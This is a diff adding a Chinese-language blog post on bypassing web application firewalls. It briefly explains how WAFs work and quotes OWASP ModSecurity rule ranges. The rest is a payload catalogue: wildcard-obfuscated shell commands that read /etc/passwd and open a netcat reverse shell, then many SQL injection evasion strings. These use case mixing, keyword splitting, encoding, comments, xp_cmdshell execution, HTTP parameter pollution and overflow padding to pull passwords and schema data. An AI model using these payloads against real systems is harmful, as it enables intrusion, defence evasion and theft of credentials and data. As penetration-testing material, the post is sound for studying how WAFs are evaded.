@@ -1,0 +1,203 @@
+---
+layout: post
+title:  "网络安全－WAF绕过"
+categories: 网络安全
+tags: 网络安全 WAF绕过
+author: xueyp
+description: WAF绕过常用技巧
+---
+
+WAF工作方式
+============
+
+- 协议异常检测：拒绝不符合HTTP标准的请求
+- 增强的输入验证：代理和服务器端验证，而不仅仅是客户端验证
+- 白名单和黑名单
+- 基于规则和基于异常的保护：基于规则的更依赖黑名单机制，基于异常则更灵活
+- 状态管理：关注会话保护还有：Cookie保护，反入侵规避技术，响应监控和信息披露保护
+
+WAF绕过
+============
+- **通配符**
+
+　　Bash标准通配符（也称为通配符模式）被各种命令行程序用于处理多个文件。有关标准通配符的更多信息可通过键入man 7 glob命令查看手册了解。
+
+　　有很多bash语法是可以使用问号“？”，正斜杠“/”，数字和字母来执行系统命令的。甚至可以使用相同数量的字符获取文件内容。例如：
+
+ls命令可以通过以下语法代替执行：
+```
+/???/?s
+```
+
+　　用这种语法，可以做许多事情。例如你的攻击目标位于Web应用放火墙后，并且在其规则内配置了一条，用于阻止所有在GET或POST请求参数内包含/etc/passwd或/bin/ls的规则，那么此时/?cmd=cat+/etc/passwd这样的请求，就会被目标WAF拦截。但是如果目标WAF没对？和/这类的字符进行阻止，那么就可以将请求编码成这样：/?cmd=%2f???%2f??t%20%2f???%2fp??s??
+
+　　问号通配符只能代表一个字符，可以是任何字符。因此，如果知道一个文件名的一部分，但不是一个字母，那么可以使用这个通配符。例如ls *.???将列出当前目录中，具有3个字符长度的所有文件。诸如.gif，.jpg，.txt之类扩展名的文件。
+
+　　使用该通配符，可以使用netcat来执行一个反向shell。假设需要在端口1337执行一个反向shell到127.0.0.1（通常是nc -e /bin/bash 127.0.0.1 1337）：
+```
+/???/n? -e /???/b??h 2130706433 1337
+```
+
+
+- **OWASP ModSecurity 核心规则集**
+
+－　**PL1~PL4**
+
+　　以下注释很好的概述了每个级别在“REQUEST PROTOCOL ENFORCEMENT”规则上的工作原理。可以看到PL1，一个查询字符串只能包含1-255范围内的ASCII字符，直到PL4在非常小的范围内阻止所有不是ASCII的字符。
+```
+# -=[ Targets and ASCII Ranges ]=-
+#
+# 920270: PL1
+# REQUEST_URI, REQUEST_HEADERS, ARGS and ARGS_NAMES
+# ASCII: 1-255
+# Example: Full ASCII range without null character
+#
+# 920271: PL2
+# REQUEST_URI, REQUEST_HEADERS, ARGS and ARGS_NAMES
+# ASCII: 9,10,13,32-126,128-255
+# Example: Full visible ASCII range, tab, newline
+#
+# 920272: PL3
+# REQUEST_URI, REQUEST_HEADERS, ARGS, ARGS_NAMES, REQUEST_BODY
+# ASCII: 32-36,38-126
+# Example: Visible lower ASCII range without percent symbol
+#
+# 920273: PL4
+# ARGS, ARGS_NAMES and REQUEST_BODY
+# ASCII: 38,44-46,48-58,61,65-90,95,97-122
+# Example: A-Z a-z 0-9 = - _ . , : &
+#
+# 920274: PL4
+# REQUEST_HEADERS without User-Agent, Referer, Cookie
+# ASCII: 32,34,38,42-59,61,65-90,95,97-122
+# Example: A-Z a-z 0-9 = - _ . , : & " * + / SPACE
+```
+
+- **SQL注入绕过WAF**
+
+1 当我们在目标URL进行SQL注入测试时，可以通过修改注入语句中字母的大小写来触发WAF保护情况。如果WAF使用区分大小写的黑名单，则更改大小写可能会帮我们成功绕过WAF的过滤。
+```
+http://target.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4
+```
+
+2 关键字替换（在关键字中间可插入将会被WAF过滤的字符） – 例如SELECT可插入变成SEL<ECT，一旦插入字符被过滤，它将作为SELECT传递。
+```
+http://target.com/index.php?page_id=-15&nbsp;UNIunionON SELselectECT 1,2,3,4
+```
+
+3 编码
+
++ URL encode
+```
+page.php?id=1%252f%252a*/UNION%252f%252a /SELECT
+```
++ Hex encode
+```
+target.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…
+　　　SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))
+```
++ Unicode encode
+```
+?id=10%D6‘%20AND%201=2%23　　
+　　　SELECT 'Ä'='A'; #1
+```
+
+4 使用注释
+
+　　在攻击字符串中插入注释。例如，/*!SELECT*/ 这样WAF可能就会忽略该字符串，但它仍会被传递给目标应用程序并交由mysql数据库处理。
+```
+index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4　　　
+　　　'union%a0select pass from users#
+index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3
+　　　?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…
+```
+
+5 某些函数或命令，因为WAF的过滤机制导致我们无法使用。那么，我们也可以尝试用一些等价函数来替代它们。
+```
+hex()、bin() ==> ascii()
+sleep() ==>benchmark()
+concat_ws()==>group_concat()
+ substr((select 'password'),1,1) = 0x70
+　　　strcmp(left('password',1), 0x69) = 1
+　　   strcmp(left('password',1), 0x70) = 0
+　　　strcmp(left('password',1), 0x71) = -1
+mid()、substr() ==> substring()
+@@user ==> user()
+@@datadir ==> datadir()
+```
+
+6 使用特殊符号
+
+　　这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法。
+```
++ ` symbol: select `version()`;
++ +- :select+id-1+1.from users;
++ @:select@^1.from users;
++Mysql function() as xxx
++`、~、!、@、%、()、[]、.、-、+ 、|、%00
+```
+　　示例
+```
+‘se’+’lec’+’t’
+　　　　　　%S%E%L%E%C%T 1
+　　　　　　1.aspx?id=1;EXEC(‘ma’+'ster..x’+'p_cm’+'dsh’+'ell ”net user”’)
+' or --+2=- -!!!'2
+ 　　　 id=1+(UnI)(oN)+(SeL)(EcT)
+```
+
+7 HTTP参数控制
+
+　　通过提供多个参数=相同名称的值集来混淆WAF。例如 http://example.com?id=1&?id=’ or ‘1’=’1′ — ‘在某些情况下（例如使用Apache/PHP），应用程序将仅解析最后（第二个） id= 而WAF只解析第一个。在应用程序看来这似乎是一个合法的请求，因此应用程序会接收并处理这些恶意输入。如今，大多数的WAF都不会受到HTTP参数污染（HPP）的影响，但仍然值得一试。
+
++ HPP（HTTP Parameter Polution)）
+```
+/?id=1;select+1,2,3+from+users+where+id=1—
+　　　/?id=1;select+1&amp;id=2,3+from+users+where+id=1—
+　　　/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users
+```
+　　HPP又称做重复参数污染，最简单的就是?uid=1&uid=2&uid=3.
+
++ HPF (HTTP Parameter Fragment)
+
+这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)
+```
+/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--
+　　select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—
+```
+
++ HPC (HTTP Parameter Contamination)
+
+RFC2396定义了以下字符：
+```
+Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' ()
+Reserved : ; / ? : @ &amp; = + $ ,
+Unwise : { } | \ ^ [ ] `
+```
+　　不同的Web服务器处理处理构造得特殊请求时有不同的逻辑.
+
+8 缓冲区溢出
+
+　　WAF和其他所有的应用程序一样也存在着各种缺陷和漏洞。如果出现缓冲区溢出的情况，那么WAF可能就会崩溃，即使不能代码执行那也会使WAF无法正常运行。这样，WAF的安全防护自然也就被瓦解了。
+```
+?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+```
+
+9 整合绕过
+
+　　当使用单一的方式无法绕过时，我们则可以灵活的将多种方式结合在一起尝试。
+```
+target.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…
+id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -
+?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--
+```
+
+参考
+============
+[WAF bypass guide](http://www.securityidiots.com/Web-Pentest/WAF-Bypass/waf-bypass-guide-part-1.html)
+
+[SQL Injection Bypassing WAF](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)
+
+[SQL injection: 9 ways to bypass Web Application Firewall](https://www.digitalmunition.me/2018/02/sql-injection-9-ways-bypass-web-application-firewall/)
+
+
+版权声明：本文为博主原创文章，转载请注明出处。 [旭日酒馆](https://xueyp.github.io/)
